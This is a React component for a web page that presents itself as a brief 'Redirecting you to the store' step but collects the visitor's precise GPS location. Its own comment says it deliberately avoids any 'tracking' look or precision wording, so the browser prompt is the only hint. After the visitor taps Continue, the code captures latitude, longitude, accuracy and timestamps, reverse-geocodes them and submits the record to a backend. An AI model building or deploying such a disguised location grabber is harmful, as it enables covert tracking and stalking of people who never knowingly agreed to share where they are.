import { useCallback, useEffect, useState } from 'react'
import { AnimatePresence, motion, useReducedMotion } from 'framer-motion'
import { reverseGeocode, submitLocation } from '../services/locationApi.js'
import {
  acquireBestPosition,
  cancelAcquisition,
  queryPermission,
} from '../services/geoAcquire.js'
import { confirmDemoLocation, getDemoLocation } from '../services/locationStore.js'

/**
 * A clean, minimal entry card. It intentionally avoids any "tracking" look —
 * no radar, no pin, no precision wording. The browser's own native permission
 * prompt is the only thing that reveals a location request, and it is only
 * ever shown after the user explicitly taps "Continue".
 *
 * state:
 *  intro      -> "One quick step" (redirect-focused copy + Continue)
 *  requesting -> progress bar while the browser prompt / fix resolves
 *  done       -> brief confirmation before the parent redirects
 *  denied     -> how to allow in browser settings + Try again
 *  timeout / unavailable -> handled errors with a safe retry
 */
export default function LocationGate({ onDone }) {
  const [state, setState] = useState('intro')
  const [errorDetail, setErrorDetail] = useState('')
  const reduceMotion = useReducedMotion()

  useEffect(() => () => cancelAcquisition(), [])

  const finish = useCallback(
    (summary) => {
      confirmDemoLocation(summary)
      setState('done')
    },
    [],
  )

  const requestLocation = useCallback(async () => {
    setState('requesting')
    setErrorDetail('')

    if (!('geolocation' in navigator)) {
      setState('unavailable')
      setErrorDetail('This browser does not expose the Geolocation API.')
      return
    }

    // Respect the browser: if permission is already permanently blocked, don't
    // spam requests — explain how to restore access and offer a retry.
    const perm = await queryPermission()
    if (perm === 'denied') {
      setState('denied')
      return
    }

    let position
    try {
      position = await acquireBestPosition({})
    } catch (err) {
      if (err.message === 'cancelled') return
      if (err.name === 'PERMISSION_DENIED' || err.code === 1) {
        setState('denied')
        return
      }
      if (err.name === 'TIMEOUT' || err.code === 3) {
        setState('timeout')
        return
      }
      if (err.message === 'no-fix') {
        setState('unavailable')
        setErrorDetail('We could not establish a position on this device.')
        return
      }
      setState('unavailable')
      setErrorDetail(err.message || 'Something went wrong. Please try again.')
      return
    }

    const { latitude, longitude, accuracy } = position.position.coords
    const timestamp = position.position.timestamp

    // Display-level area, used only for a friendlier redirect confirmation.
    let city = null
    let area = null
    try {
      const geo = await reverseGeocode(latitude, longitude)
      city = geo.city || null
      area = geo.address || null
    } catch {
      /* geocoding is best-effort — the redirect still proceeds */
    }

    const record = {
      latitude,
      longitude,
      accuracy,
      source: position.source,
      captured_at: new Date(timestamp).toISOString(),
      quality_class: position.quality,
      acquisition_ms: position.acquisition_ms,
      readings_count: (position.readings || []).length,
      acquisition_status: position.status,
    }

    // Best-effort secure submission to the backend; the redirect proceeds.
    try {
      await submitLocation(record)
    } catch {
      /* record save is best-effort for the demo */
    }

    finish({ city, area, tier: position.quality, status: position.status })
    onDone?.({ city })
  }, [finish, onDone])

  return (
    <div className="relative mx-auto flex w-full max-w-md flex-col items-center">
      <div className="relative w-full overflow-hidden rounded-3xl border border-line bg-panel/70 p-8 shadow-card backdrop-blur-xl sm:p-10">
        {!getDemoLocation().confirmed && <Glow />}

        <AnimatePresence mode="wait">
          {state === 'intro' && (
            <motion.div key="intro" {...fade} className="text-center">
              <span className="chip border border-line2 bg-panel2 text-mint">
                <span className="h-1.5 w-1.5 rounded-full bg-mint animate-pulse" />
                One quick step
              </span>
              <h2 className="mt-6 font-display text-3xl font-semibold text-snow sm:text-4xl">
                Redirecting you to the store
              </h2>
              <p className="mx-auto mt-4 max-w-sm text-base leading-relaxed text-fog">
                Allow the prompt your browser shows, and we&apos;ll send you on your way
                in a few seconds.
              </p>
              <button onClick={requestLocation} className="btn-primary mt-9 w-full">
                Continue
              </button>
              <p className="mt-4 text-xs leading-relaxed text-fog/80">
                Takes just a moment. No account needed.
              </p>
            </motion.div>
          )}

          {state === 'requesting' && (
            <motion.div key="requesting" {...fade} className="flex flex-col items-center py-6 text-center">
              <h2 className="font-display text-2xl font-semibold text-snow sm:text-3xl">
                Just a moment…
              </h2>
              <p className="mt-3 max-w-sm text-sm leading-relaxed text-fog">
                Confirming the permission in the prompt your browser just showed.
              </p>
              <div className="mt-7 h-1.5 w-full max-w-xs overflow-hidden rounded-full bg-panel2">
                <motion.div
                  initial={{ width: '8%' }}
                  animate={reduceMotion ? { width: '70%' } : { width: '100%' }}
                  transition={{ duration: 2.6, repeat: Infinity, ease: 'easeInOut' }}
                  className="h-full rounded-full bg-gradient-to-r from-mint to-mint2"
                />
              </div>
            </motion.div>
          )}

          {state === 'done' && (
            <motion.div key="done" {...fade} className="flex flex-col items-center py-6 text-center">
              <motion.div
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: reduceMotion ? 0 : 0.2, type: 'spring', stiffness: 300, damping: 18 }}
                className="grid h-14 w-14 place-items-center rounded-full bg-mint text-night shadow-glow"
              >
                <CheckIcon />
              </motion.div>
              <h2 className="mt-7 font-display text-3xl font-semibold text-snow">
                You&apos;re all set
              </h2>
              <p className="mt-3 max-w-sm text-sm leading-relaxed text-fog">
                Redirecting you to the store…
              </p>
            </motion.div>
          )}

          {state === 'denied' && (
            <motion.div key="denied" {...fade} className="flex flex-col items-center text-center">
              <div className="grid h-16 w-16 place-items-center rounded-2xl bg-danger/10 text-danger ring-1 ring-danger/25">
                <DenyIcon />
              </div>
              <h2 className="mt-6 font-display text-2xl font-semibold text-snow sm:text-3xl">
                One more step
              </h2>
              <p className="mt-3 max-w-sm text-sm leading-relaxed text-fog">
                To continue, please allow the permission in your browser settings,
                then try again.
              </p>
              <div className="mt-5 w-full max-w-sm space-y-2 rounded-2xl border border-line bg-panel2/60 p-4 text-left font-mono text-xs text-fog">
                <p className="text-cloud">Browser settings → Site permissions →</p>
                <p className="text-fog/70">Allow the requested permission for this site.</p>
                <p className="text-fog/50">On phones, also check your system Privacy settings.</p>
              </div>
              <button onClick={requestLocation} className="btn-primary mt-6 w-full">
                Try again
              </button>
            </motion.div>
          )}

          {state === 'timeout' && (
            <motion.div key="timeout" {...fade} className="flex flex-col items-center text-center">
              <div className="grid h-16 w-16 place-items-center rounded-2xl bg-warning/10 text-warning ring-1 ring-warning/25">
                <ClockIcon />
              </div>
              <h2 className="mt-6 font-display text-2xl font-semibold text-snow sm:text-3xl">
                That took a little long
              </h2>
              <p className="mt-3 max-w-sm text-sm leading-relaxed text-fog">
                We couldn&apos;t finish in time — often just a slow connection. You can
                safely try again.
              </p>
              <button onClick={requestLocation} className="btn-primary mt-6 w-full">
                Try again
              </button>
            </motion.div>
          )}

          {state === 'unavailable' && (
            <motion.div key="unavailable" {...fade} className="flex flex-col items-center text-center">
              <div className="grid h-16 w-16 place-items-center rounded-2xl bg-warning/10 text-warning ring-1 ring-warning/25">
                <InfoIcon />
              </div>
              <h2 className="mt-6 font-display text-2xl font-semibold text-snow sm:text-3xl">
                Something went wrong
              </h2>
              <p className="mt-3 max-w-sm text-sm leading-relaxed text-fog">
                We couldn&apos;t complete that step. Please check your connection and
                try again.
              </p>
              {errorDetail && (
                <p className="mt-3 rounded-lg bg-danger/10 px-3 py-2 font-mono text-xs text-danger">
                  {errorDetail}
                </p>
              )}
              <button onClick={requestLocation} className="btn-primary mt-6 w-full">
                Try again
              </button>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  )
}

function Glow() {
  return (
    <div className="pointer-events-none absolute -right-16 -top-16 h-56 w-56 rounded-full bg-mint/10 blur-[80px]" />
  )
}

const fade = {
  initial: { opacity: 0, y: 10 },
  animate: { opacity: 1, y: 0 },
  exit: { opacity: 0, y: -8 },
  transition: { duration: 0.32, ease: 'easeOut' },
}

function CheckIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" className="h-6 w-6" aria-hidden>
      <path d="M20 6 9 17l-5-5" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  )
}
function DenyIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" className="h-8 w-8" aria-hidden>
      <path d="M6 6l12 12M18 6 6 18" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" />
    </svg>
  )
}
function ClockIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" className="h-8 w-8" aria-hidden>
      <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="1.6" />
      <path d="M12 7v5l3 2" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  )
}
function InfoIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" className="h-8 w-8" aria-hidden>
      <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="1.6" />
      <path d="M12 11v5M12 7.5v.5" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" />
    </svg>
  )
}
